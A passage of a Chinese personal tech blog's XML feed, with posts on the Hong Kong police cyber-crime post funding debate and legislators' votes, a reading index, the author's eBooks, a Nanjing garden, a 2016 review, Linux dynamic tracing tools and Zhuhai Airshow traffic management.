200章)第161條(有犯罪或不誠實意圖而取用電腦) 提出檢控，遏制言論自由。他要求當局提供資料， 說明有多少人員獲調配收集市民透過互聯網發放 有關社會運動及示威活動的信息。陳偉業議員對此 亦表憂慮。 更有舆论强烈质疑香港政府强化网军实为打击异己、走向专制： 一、警方網軍快速膨脹：CSTCB於成立兩年間人手由180人大幅增加三成至238人。但有關小組（網絡偵測隊、網絡情報隊）的職責說明從未仔細公開。逐年下降之際，警方紀律人員人數仍然於六年上升5%。二、網上巡邏淪為政治工具：「網上巡邏」是CSTCB其中一項工作。2014年涉將部份警務人員資料上載的督察施恒一案中，警方透過網上巡邏收集證據並提出起訴。近年，我們見到很多網民因網上言論而被拘捕，令人懷疑所謂「網上巡邏」已淪為政治打壓的工具，針對異己。三、警察變黑客，竊取網上資料「無皇管」：現時《截取通訊及監察條例》未能規管政府要求網絡供應商要求交出通訊記錄或者限制警方以黑客軟件竊取市民個人資料。 上一财政年度EC(2014-15)19付諸表決，該項目被否決。投票結果如下：贊成黃定光議員 吳亮星議員 姚思榮議員 張華峰議員 鄧家彪議員李慧琼議員 何俊賢議員 郭偉强議員 潘兆平議員 (9名委員) 反對何俊仁議員 梁耀忠議員 何秀蘭議員 陳偉業議員 范國威議員陳志全議員 張超雄議員 李慧琼議員 何俊賢議員 郭偉强議員潘兆平議員 李卓人議員 劉慧卿議員 梁家傑議員 胡志偉議員莫乃光議員 梁繼昌議員 單仲偕議員(14名委員) 未了残局综上所述，关于增加网络安全和科技罪案总警司职位的拨款预算，无论赞成派还是反对派，争议的焦点并不在于香港政府每年增加二百二十八万港元的财政开支，而在于政府加强网警的动机何在，突出反映了香港各派政治力量的严重分歧。 至于当局为什么非要单设一个总警司职位，其实还有一个技术考量：根据香港特区现行《截取通讯及监察条例》，执法单位开展监听监视活动必需获得如下授权： (a) 截取及第 1 類監察 任何小組法官。《截取通讯及监察条例》第3部 订明授权等：(1)行政長官須按終審法院首席法官的建議，為本條例的目的委任3名至6名合資格法官為小組法官。小組法官的任期為3年。“合資格法官” (eligible judge)指原訟法庭法官。 (b) 第 2 類監察 只有以下職級的人員方可獲指定為授權人員—(i) 就香港海關而言，職級不低於總監督的香港海關人員；(ii) 就香港警務處而言，職級不低於總警司的警務人員；(iii) 就入境事務處而言，職級不低於高級首席入境事務主任的入境事務處人員。(iv) 就廉政公署而言，職級不低於首席調查主任的該公署行動處的人員。 虽然香港立法会目前仍未就该议案最终表决，但是从实际运作情况以及今年行政长官选举结果分析，最终通过议案也就是这一两个财年之内的事。作为观察者而言，都是一个透视香港舆情动态、理解代议制权力运行模式的极佳案例。 小记 2014年：保安局向立法会申请开设总警司职位，立法会项目编号：EC(2014-15)19 2015年：3月11日～4月29日。立法会人事编制小组委员会投票否决。9票赞成，14票反对。贊成黃定光議員 李慧琼議員吳亮星議員 何俊賢議員姚思榮議員 郭偉强議員張華峰議員 潘兆平議員鄧家彪議員 反對何俊仁議員 李卓人議員梁耀忠議員 劉慧卿議員何秀蘭議員 梁家傑議員陳偉業議員 胡志偉議員范國威議員 莫乃光議員陳志全議員 梁繼昌議員張超雄議員 單仲偕議員 2016年：6月，保安局再次提交建议 2016年：12月6日，咨询立法会保安事务委员会，大致同意。 2017年：1月4日～2月21日，立法会人事编制小组委员会同意。15票赞成，7票反对。贊成黃定光議員,Wong Ting-kwong,SBS,JP,1949 (进出口功能界别，太太是工联会会长林淑仪。香港中华出入口商会副会长、香港中华总商会会董、东莞同乡总会荣誉会长)李慧琼議員,Starry Lee Wai-king,SBS,JP,1974 (区议会功能界别，民建联主席，香港科技大学会计系，注册会计师&amp;事务所合伙人，25岁土瓜湾北直选连任至今)潘兆平議員Poon Siu-ping,BBS,MH,1957 (劳工界功能界别，港九劳工社团联会支持。在2016年及2017年香港政治制度改革方案表决时，潘兆平是除主席外，唯一一个在立法会在座，但没有按钮投票的议员，令他“一炮而红”。)郭偉强議員,K,wok Wai-keung,1978 (香港岛选区，工联会会员)姚思榮議員,1952（旅游届功能界别，香港中国旅行社副董事长，香港旅游业议会副主席，2012当选、提名梁振英）马逢国议员,Ma Fung-kwok,SBS,JP,1955 (体育演艺文化出版界别，银都机构负责人，丑闻：2013年演艺人协会联同10大下属协会要求马逢国立即辞职。)廖长江议员,Martin Liao Cheung-kong,SBS,JP,1957(商界界别，香港赛马会董事，执业大律师，英国伦敦大学学院，香港新民党荣誉法律顾问)卢伟国议员,Lo Wai-kwok,SBS,BBS,MH,JP,1953(工程界界别，香港大学机械工程专业，香港工程师学会前会长，新进科技集团有限公司副主席兼董事总经理，1992年当选香港十大杰出青年)锺国斌,Chung Kwok-pan,1963（纺织及制衣界功能界别，英国罗伯特戈登大学理学士，苏格兰斯特林大学MBA,香港制衣同业协进会会长，自由党党魁，锺伟明织造厂董事）何启明议员,1985 ）(劳工界功能界别，观塘区议会议员，香港工会联合会成员)周浩鼎议员,Holden Chow Ho-ding,1979 (区议会功能界别，民建联副主席，执业律师，英国伦敦政经&amp;香港大学，丑闻：浩鼎门事件)邵家辉议员，Shiu Ka-fai，1970（批发及零售界界别、自由党副主席及东区宝马山选区民选区议员，已放弃新西兰国籍）柯创盛议员,Wilson Or Chong-shing,1973 (观塘区，职业议员，丑闻：学历造假门)陈振英议员,Chan Chun-ying,1961 (金融界功能界别，长期在中资银行任职，获得汇丰、渣打、花旗、中银以及东亚等银行支持)刘国勋议员,Lau Kwok-fan,1981 (区议会功能界别，民建联，香港中文大学，夫人：民建联元老吕学能的女儿吕迪明) 反對梁国雄议员,Leung Kwok-hung,1956 (新界东选区，绰号“长毛”Longhair，托洛茨基主义，传统左翼激进反对派）陳志全議員,Raymond Chan Chi-chuen,1972 (新界东选区，泛民主派，人民力量主席。电台及电视节目主持人)張超雄議員,Fernando Cheung Chiu-hung,1957 (新界东选区，香港理工大学应用社会科学系讲师，工党副主席。1980年毕业于香港浸会学院社会工作系，毕业后任职社会福利机构)朱凯迪议员,Eddie Chu Hoi-dic,1977 (新界西选区，香港中文大学中文系，环保主义、反高铁，支持梁国雄出选特首)林卓廷议员,Lam Cheuk-ting,1977(新界东选区，香港中文大学政治与行政学系，曾任廉政公署调查主任、民主党总干事)罗冠聪议员,Nathan Law Kwun-chung,1993(香港岛选区，五十八届学联秘书长，23岁当选议员，居于东涌的公共屋邨，电子竞技评论员，岭南大学文化研究系)姚松炎议员,Edward Yiu Chung-yim,1964(建筑测量界别，皇家特许测量师学会资深会员，香港大学) 2017年：5月12日，立法会财务委员会，未完成审议，延期审议。 扩展阅读：《The Cyber-Security Master》 Cyber-Security: 黑客与技术、产业及其精神世界 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 文汇报：香港保安局申设总警司 香港特区立法会人事编制小组委员会议事日程 香港特区立法会财务委员会会议纪要&amp;投票结果 香港特区立法会财务委员会人事小组委员讨论文件EC(2016-17)23 ,20170114 香港特区立法会财务委员会人事小组委员讨论文件ECS82/14-15 ,20150429 《截取通訊及監察條例》 《截取通訊及監察條例》 實務守則.pdf) 维基百科，刘慧卿 香港特区立法会财务委员会人事小组委员讨论文件EC（2016-2017）/23，20170104]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Cyber-Security</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Study The Master]]></title>
    <url>%2F2017%2F02%2F13%2FMaster%2F</url>
    <content type="text"><![CDATA[摘要 Master Citation Index（持续更新） If you want to master something, teach it. —— Richard Feynman 什么是经典文献？基于Calvino（2000），Kuhn（2012）和Soderlund及Geraldi（2012）的理论，作者建立了学术领域判断经典文献的方法： 首先，影响力； 其二，对公共话语影响的持久价值； 第三，对学科形成的影响，这是核心的，也是最难判断的； 第四，文献需要对读者产生个人影响。 例如，美国项目管理协会PMI的PMBOK虽然能满足第一和第二个标准，但无法满足第四个标准，当读第二遍时，读者无法从中获得更深刻的洞见，因此只是基础的知识范围概括，而不是经典文献。 Index Engineering Blog Engineering Index 机器学习项目 机器学习书单 Master Citation Index唐·诺曼 Donald Arthur NormanEngineeringHenry Petroski 《 To Engineer is Human: The Role of Failure in Successful Design (1985)》| Scientist 杰弗里·埃弗里斯特·辛顿（Geoffrey Everest Hinton） Information TechnologyHackersPaul Graham （保罗·格雷厄姆）美国著名程序员、风险投资家、技术作家。Paul Graham 以 Lisp 方面的工作而知名，也是最早的Web应用Viaweb的创办者之一，后来以近5千万美元价格被雅虎收购，成为Yahoo! Store。他拥有哈佛大学应用科学（计算机方向）博士学位，担任麻省理工学院副教授，并且在罗德岛设计学院和佛罗伦萨绘画艺术学院学习过绘画。 代表作：《黑客与画家》（Hackers &amp; Painters） 内容来自 Paul Graham 的博客，该文集主要讨论编程语言、黑客工作方法以及作者对于教育、版权制度和创业精神等方面的观点。书中的内容不但有助于了解计算机编程的历史、互联网行业规则，还有助于读者了解我们这个时代，走进 Hacker 的精神世界。 System SpecialistBrendan Gregg DTrace Top 1 Sasha Goldshtein Currently interested in .NET performance optimization, modern C++, parallel programming frameworks, production debugging, native mobile application development, Node.js, Microsoft Azure, and cyber-warfare (security). Sasha Goldshtein: Making .NET applications faster Sasha Goldshtein:Tracing Runtime Events in .NET Core on Linux 章亦春|agentzh Nginx developer, DTrace 动态追踪技术漫谈 Gustavo Duarte OS kernel Julia Evans OS kernel,DTrace,Rust Front Specialist邱俊涛 Front, Tools, methodology 主要的编程语言是Java和JavaScript，也有几年Linux下C语言的开发经验，喜欢各种动态语言，尤其如JavaScript，而现在Ruby也成了我工具箱里最主要的工具了。目前关注在前端，对于 使用前端技术搭建轻量级的Web应用尤为感兴趣。 《JavaScript核心概念及实践》《轻量级Web应用开发》《3周3Web设计》《Fun with underscore.js》 阮一峰 My name is Ruan YiFeng(阮一峰). You can call me Frank. I was born in 1970s.I am an IT developer focusing on web technology, and a strong advocate and believer of Free Software.Now I am employed by Alipay.com as an Node/JavaScript engineer.I have an Economics degree, and once worked for a local college in Shanghai as an assistant professor. ECMAScript 6入门（电子工业出版社，2014，ISBN 9787121238369）黑客与画家（人民邮电出版社，2011，ISBN 9787115249494）软件随想录（人民邮电出版社，2009，ISBN 9787115216342）异常流行幻象与群众疯狂/困惑之惑（[台湾]财讯出版社，2007，ISBN 9789867084385）下一个大泡泡（中国社会科学出版社，2005，ISBN 9787500452300） Database Specialist 盖国强 Oracle C Specialist 云风-吴云洋 C,Game真名吴云洋，曾任网易杭州研究中心总监，是网易《大话西游》、《梦幻西游》等游戏的主要开发者，他在2011年9月从网易辞职，并与前网易COO詹钟晖联合创办了简悦（EJOY）游戏公司，任公司CTO。Ejoy2D创始人（一款基于C和Lua开发的游戏图形引擎） 综合类 张子辰（龙哥/飞龙）|Wizard Zhang 大量 翻译作品，编程语言、算法、机器学习等 DevOps Yuxi Wang Tech Lead of Operations team at 本木医疗 全网统一账户实践 树莓派raspberrypi、saltstack-在线下自助机运维上的应用/ 通过-novnc-实现数千台自助机的实时可视化/ 概要知识地图 StuQ 技能图谱由 StuQ 发起的一个开源项目，志在汇集整理 IT 职业必备技术技能，帮助技术人梳理知识框架结构，并尝试提供学习路径和精华资源，方便技术人学习成长。 项目地址（Github） 纸质版 源代码库 NASA 来自火箭科学，NASA发布了大量的免费代码 | Linux Story]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电子书 | Overview of RiboseYim's eBook]]></title>
    <url>%2F2017%2F02%2F09%2FeBook%2F</url>
    <content type="text"><![CDATA[摘要 《The Linux Perf Master》 《The Cyber-Security Master》 《The Machine Learning Master》 If you cannot explain something in simple terms, you don’t understand it. The best way to learn is to teach. —— Richard Feynman‏ 故事佛罗里达州立大学的心理学教授，安德斯·埃里克森（Anders Ericsson） 幼稚练习（naïve practice）： 从你自觉“基本可以了”的那一刻，进步就停滞了。刻意练习（deliberate practice）：预，是有明确预期（purposeful practice），怎样的练习成果是好，怎样是差，并且知道需要衡量哪些指标来给自己反馈。思，是要用脑思考，不是一味沿用老办法，而是用各种新方式不断尝试，如此，才能不断往上突破，真正能提升能力。 一项英国研究显示，伦敦的士司机与公交司机同样开车多年，但只有的士司机负责记忆空间位置的大脑海马区变大。盖因公交司机每日开同一条路线，固然驾轻就熟，大脑却未得足够挑战。而的士司机需要时时掌握伦敦最新路况，思考如何最快最顺地将乘客送达，大脑遂得充分发展。 一个学会拉《梁祝》的人，重复练五年后可能拉得不费吹灰之力，对曲子的控制力与表现力却不曾精进半分——没准还不如刚学会时。顶级医院里，老医生是一流人才，因其持续面对疑难杂症，必须不断突破自我。在无甚挑战的小医院，年资高的医生有时反而知识陈旧落后，还不如毕业没多久的年青医生。才能如逆水行舟，不进则退。顺风顺水地练了一万小时？你可能只是在幼稚练习。 Everyone can publish an e-book2016年7月份我已经提到，希望能实现一个小目标：出版一本专业书籍。目标虽小，实现不易。参阅了众多老司机的成功经验，我决定还是先整理一本电子书出来。《Linux Perf Master》Edition 0.1 在 2017 年初首次发布于GitBook，主题以Linux性能为核心，覆盖评估诊断、监控、优化的工具和方法论，还补充了几个参考案例，内容来源于过去一段时间翻译、发表过的文章，部分章节稍微调整了排版。 写作工具链早期没有使用 Markdown 发表的文章，没办法做到一键复用，必须再次进行繁琐的排版。另外，个人也不推荐使用编辑器：GitBook Editor for Mac ，它使用起来不太友好，也很容易崩溃。也不推荐在本地搭建一套自己的GitBook服务端，对个人用户来说过于繁琐。我的方式是“本地编写+自动同步”的方式：Git + Markdown真是珠联璧合、威力无穷。更多细节请查看：我的写作工具链（持续更新） 我的电子书《The Linux Perf Master》Topics: Linux，性能追踪 &gt;&gt;&gt;&gt;&gt;&gt;了解更多&gt;&gt;&gt;&gt;&gt;&gt; riboseyim.gitbook.io 【百度云盘 pdf、mobi、ePub】 Edition 0.4 20180714 legacy.gitbook.com 《The Cyber-Security Master》Topics:网络安全 &gt;&gt;&gt;&gt;&gt;&gt;了解更多&gt;&gt;&gt;&gt;&gt;&gt; 《The Machine Learning Master》 Topics:机器学习 &gt;&gt;&gt;&gt;&gt;&gt;了解更多&gt;&gt;&gt;&gt;&gt;&gt; License版权声明：自由转载-非商用-非衍生-保持署名| Creative Commons BY-NC-ND 4.0 You are free to Share copy and redistribute the material in any medium or formatThe licensor cannot revoke these freedoms as long as you follow the license terms. Under the following terms: Attribution — You must give appropriate credit, provide a link to the license, and indicate if changes were made.You may do so in any reasonable manner, but not in any way that suggests the licensor endorses you or your use. NonCommercial — You may not use the material for commercial purposes. NoDerivatives — If you remix, transform, or build upon the material, you may not distribute the modified material. No additional restrictions — You may not apply legal terms or technological measures that legally restrict others from doing anything the license permits. 参考文献 The Economics of Writing a Technical Book ECMAScript 6 入门 怎样练习，才能成为一流专家？| 科学松鼠会@游识猷]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>eBook</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[旅行指南|园林鉴赏]]></title>
    <url>%2F2017%2F01%2F30%2FArtistic-Garden%2F</url>
    <content type="text"><![CDATA[摘要 南京瞻园 南京瞻园瞻园园虽不大，却颇具特色： 山水园林：假山、人工湖造型设计艺术 政务园林：江宁布政使司衙门驻地，兼具行政和生活功能 历史园林：太平天国专史博物馆，史料较丰富。 瞻园位于南京市秦淮区夫子庙景区，坐北朝南，纵深127米，东西宽123米。是南京现存历史最久的明代古典园林，是江南四大名园。 “瞻园”始建于明朝初年，清朝时为江南布政使办公的地点，太平天国时期为东王杨秀清王府。瞻园历经岁月变迁，多次焚毁、修葺。 “瞻园”的历史可追溯至明太祖朱元璋称帝前的吴王府。明朝初年，朱元璋因念功臣徐达“未有宁居”，特赐予中山王徐达作为府邸花园。经徐氏七世、八世、九世三代人修缮与扩建，至万历年间已初具规模。 乾隆帝巡视江南，曾驻跸此园，并御题“瞻园”匾额。 1853年太平天国定都南京后，“瞻园”先后为东王杨秀清府、夏官副丞相赖汉英衙署和幼西王萧有和府。清同治三年(1864年)，清军夺取天京，该园毁于兵燹。同治四年(1865年)、光绪二十九年(1903年)，“瞻园”两度重修，但已非原园景况。“瞻园”中还辟有太平天国历史博物馆，是唯一的太平天国专史博物馆。 民国时，江苏省长公署、国民政府内政部、水利委员会、中统局特务总部、宪兵司令部看守所等政府机关曾设园内。 1960年，我国著名古建专家刘敦桢教授主持“瞻园”的恢复整建工作。 87年版《红楼梦》，赵雅芝版《新白娘子传奇》的白府取景地（待考证）。 参考文献 江南名园——瞻园 | 2016-05-05 王彝伟]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>摄影</tag>
        <tag>Travel</tag>
        <tag>Artistic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的2016年度盘点]]></title>
    <url>%2F2017%2F01%2F01%2FCheck2016%2F</url>
    <content type="text"><![CDATA[摘要 This article is part of an Autobiography tutorial series. Make sure to check out my other articles as well: 我的 2019 年度盘点 我的 2018 年度盘点 我的 2017 年度盘点 我的 2016 年度盘点 我的 2012 阅读书单 2016年度盘点一、实践 Oracle数据库迁移割接实践 基于LVS的AAA负载均衡架构实践 基于Ganglia实现服务集群性能态势感知 动态追踪技术：Linux喜迎DTrace 赠书活动 社区活动:GOPS上海站EGO社群:Commounity Over Code51CTO企业安全广州DevOps 运营工具链1）增加七牛云作为图片存储仓库：提高跨平台移植能力。2）小密圈：简书号第一次被注销（投诉后恢复），警惕。 搬家：两次，思路决定出路，过程优化。 摄影：上海市博物馆特辑（青铜、佛教造像、印章）、2016珠海航展特辑 出版：(探索中)如何出版技术书籍? 生活案例：性能优化思路：从珠海航展交通管控实践谈起 二、荣誉 高效运维社区|开放运维联盟 2016年度金牌作者 Writer #Ops 007 全部作者 三、文章列表 原创：数据可视化（一）思维利器 OmniGraffle 绘图指南 翻译：TED访谈Linus Torvalds: The mind behind Linux（高效运维公众号推荐） 原创：Oracle数据库迁移割接实践（高效运维公众号推荐） 原创：基于LVS的AAA负载均衡架构实践： 开源中国（首页推荐|每日一博），当日阅读2000+，收藏人数100+ 原创：基于Ganglia实现服务集群性能态势感知（开源中国推荐） 原创：动态追踪技术：Linux喜迎DTrace（开源中国推荐） 翻译：《Stack Overflow: The Architecture - 2016 Edition》（高效运维公众号推荐） 翻译：《Stack Overflow: The Hardware》 翻译：《LinkedIn开源Kafka Monitor》 翻译：Cyber-Security:网络安全专题 原创：《木马来袭：今天你被挖矿了吗？》 原创：《木马来袭：SSH并不安全》 原创：《最佳写作实践：从Evernote到Ulysses》 原创：《基于Linux单机的负载评估》 翻译：《Linux性能分析模型－In 60 Seconds》 原创：基于Github的开源项目管理流程（1） 翻译：NTOP 2016 路线图（开源中国推荐） 原创：美军体能训练观察 原创：美军士官制度观察 原创：体能标准横向评测 原创：跑步应用Nike+ Running与Garmin Mobile评测 读书笔记：《李自成》（姚雪垠） 读书笔记：《万历十五年(黄仁宇)》 读书笔记：《放宽历史的视界》(黄仁宇) 读书笔记：《国士无双伍连德》 读书笔记：粮食还是罂粟？小说中的经济学悖论 读书笔记：传统兵法摘要：选兵练将 翻译：Economist译文:欧洲难民计划：移民危机管理 翻译：Economist译文:The Saudi blueprint 沙特王国的改革蓝图 翻译：Economist译文:2016年全球经济形势预测 翻译：Economist译文:印度电商竞赛 翻译：Economist译文:越共换届－巨变或轮回？（201612封禁） 翻译：Economist译文:事与愿违的后门程序 翻译：Economist译文:当代德国纳粹魅影 翻译：Economist译文:自由迁徙的障碍（201612封禁） 翻译：Economist译文:奢侈品—万金藏獒（201612封禁） 原创：钞票任务：风流小王爷 原创：艺术评论：舞台剧《南海十三郎》幕后故事 原创：艺术评论：电影《灵魂解码《林肯》》 2016年中盘点要点1.从阅读到翻译的进化 2.若要阅读，必须写作，做项目一样去写作 3.注意力是最宝贵的资源 4.向看不见的朋友学习 5.人的终极追求：”Just for Fun!” 6.付费意识：为演化买单 最佳信源：《Economist》如何使用有限的篇幅阐述观点如何在团队活动中协调一致性：《the economist style》如何建立专业分析数据库，数据可视化 最佳教练：专业社区高效运维社区、InfoQ社区、GitHub社区 工具箱：写作三件套素材仓库：Evernote思维绘图：OmniGraffle专业写作：Ulysses 不可忽视随机事件的驱动力 参考文献]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[专题：动态追踪技术]]></title>
    <url>%2F2016%2F11%2F26%2FDTrace%2F</url>
    <content type="text"><![CDATA[摘要 动态追踪技术：DTrace for Linux Linux 追踪器选型 应用软件运行速度提升的关键在于有一个好的性能分析器(profiler)帮助指导程序开发。《黑客与画家》（Hackers &amp; Painters） Introduction to DTraceWhat is DTrace通过前面几篇文章的介绍，我们已经可以通过一系列命令，从不同维度获得操作系统当前的性能运行情况。另外，借助类似 Ganglia 这样的开源产品，持续不断地实施性能数据采集和存储，我们基于时间序列的历史性能图形，就可以大致判读出计算集群的资源消耗情况和变化趋势。但是，仅仅这些还是不够的，在很多情况下，我们希望能够知道：“慢，是为什么慢；快，又是为什么快”。如果要回答这个问题，就必须引入另外一件神兵利器：动态追踪技术（Dynamic Tracing）。 鉴于这套兵器过于复杂（牛逼），属于专家级技能， advanced performance analysis and troubleshooting tool。据称掌握该技能需要耗费大约100小时以上，所以如果不是对于系统性能问题有极致追求，以及变态般地技术狂热，建议绕过本文。为了便于展开，今天先起个头，重点梳理下动态追踪技术的发展简史和目前的生态环境。更加具体详细的内容，会在后续的文章中陆续发表。 严格来说，DTrace这个词本身，已经并不是狭义上基于 Solaris 的那套工具了，而是代表的是后现代操作系统的一整套工具家族和方法论。 History of DTrace 当时 Solaris 操作系统的几个工程师花了几天几夜去排查一个看似非常诡异的线上问题。开始他们以为是很高级的问题，就特别卖力，结果折腾了几天，最后发现其实是一个非常愚蠢的、某个不起眼的地方的配置问题。自从那件事情之后，这些工程师就痛定思痛，创造了 DTrace 这样一个非常高级的调试工具，来帮助他们在未来的工作当中避免把过多精力花费在愚蠢问题上面。毕竟大部分所谓的“诡异问题”其实都是低级问题，属于那种“调不出来很郁闷，调出来了更郁闷”的类型。—《漫谈动态追踪技术》 通观DTrace的演变过程，几乎相当于一部现代操作系统系统的发展史，细查起来，极其复杂。但是有两个人非常值得关注，一个是国际级的布道师，一个是国内的代表人物，初学者完全可以通过阅读他们的文章、代码，甚至微博／Twitter动态，了解动态追踪技术的实际应用情况。 Brendan Gregg前SUN性能工程师，最早的DTrace用户，出版了包括《性能之巅》在内的一大批书籍，囊括了性能问题领域的技术、工具、方法论等方方面面。他是动态追踪技术当之无愧的首席布道师，维护的个人博客发布了大量的原创内容，并且持续保持着相当的活跃度。可以作为第一手的学习资料。 Twitter：个人网站： 章亦春网名 agentzh。开源项目OpenResty创始人，编写了很多 Nginx 的第三方模块， Perl 开源模块，以及最近一些年写的很多 Lua 方面的库。他发表过的《漫谈动态追踪技术》，是目前唯一由Brendan认证的中文资料，入门首选。另外，他本人也在目前的工作、开源项目运营中大量使用动态追踪技术。微博： Linux 追踪器选型动态追踪技术最复杂的地方在于追踪器种类繁多，让人一时无从下手。根据前人的一些经验总结，建议按照以下路径进行选择： 普通模式适用于：开发者, 系统管理员, DevOps, SRE CPU分析 perf_events的应用很广泛，配合Brendan Gregg老师研究的火焰图工具，可以分析程序在所有代码基的资源消耗，精确定位到函数级。例如： 进程追踪1234567# ./execsnoopTracing exec()s. Ctrl-C to end. PID PPID ARGS 22898 22004 man ls 22905 22898 preconv -e UTF-8 22908 22898 pager -s 22907 22898 nroff -mandoc -rLL=164n -rLT=164n -Tutf8 HARD模式适用于：性能或内核工程师 Understanding all the Linux tracers to make a rational decision between them a huge undertaking. 0、dtrace 案例：ipfans:使用dtrace跟踪Python应用 1、ftrace内核hacker的最爱。已经包含在内核，能够支持 tracepoints, kprobes, and uprobes,并提供一些能力: 事件追踪, 可选择过滤器和参数; 事件计数和时间采样，内核概览；基于函数的路径追踪。 动态追踪技术（三）：Tracing your kernel Functions! | @RiboseYim 2、perf_eventsLinux用户的主要追踪器之一，它的源代码在内核中，通常在一个 linux-tools-common包。 3、eBPF基于内核的虚拟机 动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪 4、 SystemTap最强有力的追踪器。它可以做几乎所有的事情: 分析，打点, kprobes, uprobes (源子 SystemTap), USDT, 内核编程等。 5、LTTng事件收集器, 优于其它追踪器，支持多种事件类型，包括 USDT。The LTTng Documentation v2.9 Sasha Goldshtein:Tracing Runtime Events in .NET Core on Linux 6、ktap一个很有前景的追踪器，基于lua内核虚拟机 7、dtrace4linux个人开发者业余产出 (Paul Fox) ，将 Sun DTrace迁移到 Linux。 8、OL DTraceOracle Linux DTrace，将 DTrace 迁移到Oracle Linux的实现。 9、sysdig一种新型追踪器， 能够基于类似tcpdump的命令操作 syscall events, 再用lua后处理。 10、strace + gdb strace - trace system calls and signals 动态追踪技术（二）：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪 time: Sleep requires ~7 syscalls 火焰图应用案例 阮一峰:如何读懂火焰图？ Thayne McCombs:如何使用火焰图来降低服务器负载 PROFILING GO APPLICATIONS WITH FLAMEGRAPHS| February 28, 2018 A blazing fast flame graph tool for Node and V8. Used to visualize and explore performance profiling results SRE: Performance Analysis: Tuning Methodology Using a Simple HTTP Webserver In Go | go tool pprof 勘误 No.001 初稿已删除【大家比较熟知的netfilter，就是基于BPF实现的动态编译器】本来是想表达 iptables 对 bpf 的支持。 扩展阅读动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details How Linux Works Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 参考文献 动态追踪技术漫谈 | 章亦春 动态追踪技术（中） - Dtrace、SystemTap、火焰图 | 原创 2016-05-06 章亦春 MacTalk 动态追踪技术-应用性能瓶颈排障利器之火焰图 | 2016-12-01 郑晓川 江凌生 TIGCHAT 运维利器：万能的 strace | 2016-05-24 王子勇 高效运维 (推荐)Linux tracing systems &amp; how they fit together | Julia Evans Give me 15 minutes and I’ll change your view of Linux tracing | Brendan Gregg’s Blog Where has my disk space gone? Flame graphs for file systems | Brendan Gregg’s Blog Container Performance Analysis at DockerCon 2017 | Brendan Gregg’s Blog (推荐) Julia Evans: Linux tracing systems &amp; how they fit together 使用 dtrace 跟踪 Python 应用 | ipfans’s Blog Probing the JVM with BPF/BCC | Sasha Goldshtein 从eBay购物车丢失看处理网络I/O Go’s march to low-latency GC Tracing Runtime Events in .NET Core on Linux | March 30, 2017 案例分享：巧用各种工具提升无源码系统的性能和稳定性 | 原创： 杨振 董建 高可用架构 1月17日 COZ: Finding Code that Counts with Causal Profiling]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>DTrace</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[珠海航展交通管控实践]]></title>
    <url>%2F2016%2F11%2F20%2FNetwork-Traffic%2F</url>
    <content type="text"><![CDATA[摘要 工程案例 从2008年算起，笔者已经参加了5届珠海航展。在过去的航展中，群众“吐槽”最多的就是航展期间的交通，笔者亲身经历过的几次，无论是公交还是私家车方式，都体会到了“机场航展、路上车展”的拥堵悲壮感。 2016年珠海航展的交通状况却出奇的好，这引起了我的研究兴趣——按照Google SRE的理念，我们应该思考，自己的实践经验是否可以在其它行业复制，不同领域的成功实践是否能为我所借鉴学习。那么这次成功交通流量管控实践，是否可以为解决信息系统性能问题、架构设计优化提供借鉴思路呢？谨以此文，聊作记录。 问题描述展馆位于珠海市三灶机场。机场本身是在一个南面临海的半岛，展会期间的主要流量方向来自市区、珠三角城市群、外地经广深中转人群。主要的人、车流量会从北、东、西三个方面汇入，穿越市区，经过跨海大桥以及机场高速，进入珠海西部区域。如图所示： 这是一个典型的流量突发峰值场景：1、东部区域为主要流量入口，西部区域交通路网稀疏，对接容量不足；沿途多山靠海，地形地貌蜿蜒复杂，任意一点出现延时，会很快扩散，回旋空间小；2、航展两年举办一次，每次一周。特别为此硬性扩容，经济性太差；3、整个业务链条存在明显的薄弱环节：珠海大桥（珠海大道主干道单向4车道，辅道单向3车道，7条车道的车流集中汇集在珠海大桥上桥处，而珠海大桥单向只有3车道）； 